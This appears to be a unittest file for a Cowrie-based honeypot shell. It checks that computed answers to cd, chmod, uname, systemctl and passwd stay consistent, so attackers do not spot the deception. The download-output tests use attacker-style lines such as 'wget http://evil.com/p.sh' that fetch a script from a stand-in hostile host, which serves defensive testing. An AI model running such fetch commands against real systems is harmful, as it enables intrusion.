"""
tests/test_responders.py — answers produced without asking a model.

The reason every one of these exists: a computed answer cannot contradict
itself. Each class below pins a contradiction that was actually observed.

Cowrie is a plain callable here (`probe`), so nothing needs a container.

Run:  python3 -m unittest discover -s tests -p "test_responders.py" -v
"""
import os
import random
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shell.fakefs import FakeFS                       # noqa: E402
from shell.responders import Responders               # noqa: E402
from shell.software import Software                   # noqa: E402
from shell.state import StateTracker                  # noqa: E402


class Host:
    hostname = "psu"
    kernel = "5.15.0-91-generic"
    kernel_build = "#101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023"
    arch = "x86_64"


def build(cwd="/root", files=None, probe=None):
    state = {
        "cwd": cwd, "files": files if files is not None else {},
        "installed": {}, "versions": {}, "services": {},
        "users": {"root": {"uid": 0, "gid": 0, "home": "/root", "shell": "/bin/bash"}},
        "shadow": {},
    }
    fs = FakeFS(state, "root", {"/", "/etc", "/tmp", "/var"})
    sw = Software(state, base_tools=["ls"])
    tracker = StateTracker(state, fs, sw)
    return Responders(state, fs, tracker, host=Host, probe=probe), state


class TestCd(unittest.TestCase):
    """A model that wrongly accepts `cd .ssh` cannot un-believe it, and echoed
    a fake `root@host:~/.ssh#` prompt for the rest of the session."""

    def test_success_is_silent_and_moves_the_cwd(self):
        r, st = build()
        self.assertEqual(r.cd("cd /tmp"), (True, None))
        self.assertEqual(st["cwd"], "/tmp")

    def test_cd_dash_toggles_and_prints_where_it_went(self):
        r, st = build()
        r.cd("cd /tmp")
        self.assertEqual(r.cd("cd -"), (True, "/root"))
        self.assertEqual(st["cwd"], "/root")
        self.assertEqual(r.cd("cd -"), (True, "/tmp"))
        self.assertEqual(st["cwd"], "/tmp")

    def test_failure_is_the_real_bash_error(self):
        r, st = build()
        handled, err = r.cd("cd /nope")
        self.assertTrue(handled)
        self.assertEqual(err, "bash: cd: /nope: No such file or directory")
        self.assertEqual(st["cwd"], "/root")

    def test_cowrie_is_asked_before_denying_a_directory(self):
        """Cowrie's tree holds ~26,000 paths we never declared -- this is how
        `cd coc-student-portal` failed for a directory `ls` had just listed."""
        asked = []

        def probe(path):
            asked.append(path)
            return path == "/root/portal"

        r, st = build(probe=probe)
        self.assertEqual(r.cd("cd portal"), (True, None))
        self.assertEqual(asked, ["/root/portal"])
        self.assertEqual(st["cwd"], "/root/portal")

    def test_a_directory_cowrie_confirmed_is_remembered(self):
        """So the next cd answers without asking again."""
        r, st = build(probe=lambda p: True)
        r.cd("cd portal")
        self.assertTrue(st["files"]["/root/portal"]["perms"].startswith("d"))

    def test_cowrie_saying_no_leaves_the_error_standing(self):
        r, st = build(probe=lambda p: False)
        handled, err = r.cd("cd portal")
        self.assertIn("No such file or directory", err)
        self.assertEqual(st["cwd"], "/root")

    def test_with_no_probe_it_still_answers(self):
        r, st = build(probe=None)
        self.assertIn("No such file", r.cd("cd portal")[1])


class TestChmod(unittest.TestCase):
    """The prompt says chmod always succeeds as root -- true, but that is not
    the same as the file existing. 20/20 loss on that before it was computed."""

    def test_a_missing_file_is_named_in_the_error(self):
        r, st = build()
        self.assertEqual(r.chmod("chmod 755 ghost"),
                         (True, "chmod: cannot access '/root/ghost': No such file or directory"))

    def test_a_tracked_file_succeeds_silently_and_the_bit_changes(self):
        r, st = build(files={"/root/f": {"perms": "-rw-r--r--"}})
        self.assertEqual(r.chmod("chmod 755 f"), (True, None))
        self.assertEqual(st["files"]["/root/f"]["perms"], "-rwxr-xr-x")

    def test_a_cowrie_owned_file_falls_through_to_cowrie(self):
        """Answering here wrote our state only, so `chmod +x f` reported
        success while the next `ls -la f` still showed -rw-r--r--."""
        r, st = build(files={"/root/f": {"perms": "-rw-r--r--", "backend": "cowrie"}})
        self.assertEqual(r.chmod("chmod +x f"), (False, None))

    def test_ambiguous_forms_fall_through_rather_than_guess(self):
        r, _ = build()
        for cmd in ("chmod", "chmod 755", "chmod -R 755 *", "chmod 755 a?c",
                    "chmod --version"):
            with self.subTest(cmd=cmd):
                self.assertEqual(r.chmod(cmd), (False, None))

    def test_a_virtual_file_succeeds_silently(self):
        r, _ = build()
        self.assertEqual(r.chmod("chmod 644 /etc/passwd"), (True, None))


class TestUname(unittest.TestCase):
    """FI 0 routed uname to Cowrie, which answered with COWRIE's identity while
    the banner said Ubuntu and the prompt said psu -- three machines, one
    session, and `uname -a` is usually an attacker's second command."""

    def test_bare_uname_is_kernel_name(self):
        self.assertEqual(build()[0].uname("uname"), (True, "Linux"))

    def test_dash_a_uses_the_real_field_order(self):
        _, out = build()[0].uname("uname -a")
        self.assertTrue(out.startswith("Linux psu 5.15.0-91-generic #101-Ubuntu"))
        self.assertTrue(out.endswith("x86_64 x86_64 x86_64 GNU/Linux"))

    def test_single_flags(self):
        r, _ = build()
        for flag, expected in (("-s", "Linux"), ("-n", "psu"),
                               ("-r", "5.15.0-91-generic"), ("-m", "x86_64"),
                               ("-o", "GNU/Linux")):
            with self.subTest(flag=flag):
                self.assertEqual(r.uname(f"uname {flag}"), (True, expected))

    def test_long_flags_match_their_short_forms(self):
        r, _ = build()
        for long_flag, short in (("--all", "-a"), ("--nodename", "-n"),
                                 ("--kernel-release", "-r"), ("--machine", "-m")):
            with self.subTest(flag=long_flag):
                self.assertEqual(r.uname(f"uname {long_flag}"),
                                 r.uname(f"uname {short}"))

    def test_combined_flags_come_out_in_canonical_order(self):
        """`uname -nrs` and `uname -srn` must print the same thing -- real
        uname orders by field, not by how you typed the flags."""
        r, _ = build()
        self.assertEqual(r.uname("uname -nrs"), (True, "Linux psu 5.15.0-91-generic"))
        self.assertEqual(r.uname("uname -srn"), r.uname("uname -nrs"))

    def test_it_declines_rather_than_guessing(self):
        r, _ = build()
        for cmd in ("uname --help", "uname --version", "uname /tmp",
                    "uname --bogus", "notuname -a"):
            with self.subTest(cmd=cmd):
                self.assertEqual(r.uname(cmd), (False, None))


class TestSystemctl(unittest.TestCase):

    def test_an_untouched_service_is_running_like_a_real_box(self):
        r, _ = build()
        self.assertIn("active (running)", r.systemctl("systemctl status ssh"))

    def test_stop_then_status_does_not_still_claim_running(self):
        """An attacker probes exactly that pair."""
        r, _ = build()
        r.systemctl("systemctl stop ssh")
        self.assertIn("inactive (dead)", r.systemctl("systemctl status ssh"))

    def test_start_and_restart_bring_it_back_silently(self):
        for verb in ("start", "restart"):
            with self.subTest(verb=verb):
                r, _ = build()
                r.systemctl("systemctl stop ssh")
                self.assertEqual(r.systemctl(f"systemctl {verb} ssh"), "")
                self.assertIn("active (running)", r.systemctl("systemctl status ssh"))

    def test_enable_and_disable_show_in_status(self):
        r, _ = build()
        r.systemctl("systemctl disable nginx")
        self.assertIn("nginx.service; disabled", r.systemctl("systemctl status nginx"))
        r.systemctl("systemctl enable nginx")
        self.assertIn("nginx.service; enabled", r.systemctl("systemctl status nginx"))

    def test_the_service_command_swaps_the_argument_order(self):
        r, _ = build()
        self.assertIn("mysql.service", r.systemctl("service mysql status"))

    def test_status_is_stable_within_a_session(self):
        """PID and memory come from the NAME, not random -- asking twice must
        not report two different processes."""
        r, _ = build()
        self.assertEqual(r.systemctl("systemctl status ssh"),
                         r.systemctl("systemctl status ssh"))

    def test_unknown_verb_and_short_form(self):
        r, _ = build()
        self.assertIn("unknown command", r.systemctl("systemctl bogus ssh"))
        self.assertIn("Usage:", r.systemctl("systemctl"))


class TestDownloadOutput(unittest.TestCase):

    def test_wget_transcript_names_the_url_and_destination(self):
        random.seed(5)
        out = build()[0].download_output("wget http://evil.com/p.sh", "wget")
        self.assertIn("http://evil.com/p.sh", out)
        self.assertIn("'/root/p.sh' saved", out)
        self.assertIn("200 OK", out)

    def test_curl_dash_o_uses_the_given_destination(self):
        random.seed(5)
        out = build()[0].download_output("wget -o /tmp/x http://evil.com/y", "wget")
        self.assertIn("Saving to: '/tmp/x'", out)

    def test_curl_prints_a_progress_table_not_a_wget_transcript(self):
        random.seed(5)
        out = build()[0].download_output("curl http://evil.com/y", "curl")
        self.assertIn("% Total", out)
        self.assertNotIn("Saving to:", out)


class TestPasswd(unittest.TestCase):

    def test_root_is_never_refused(self):
        self.assertEqual(Responders.passwd(), "passwd: password updated successfully")


if __name__ == "__main__":
    unittest.main(verbosity=2)
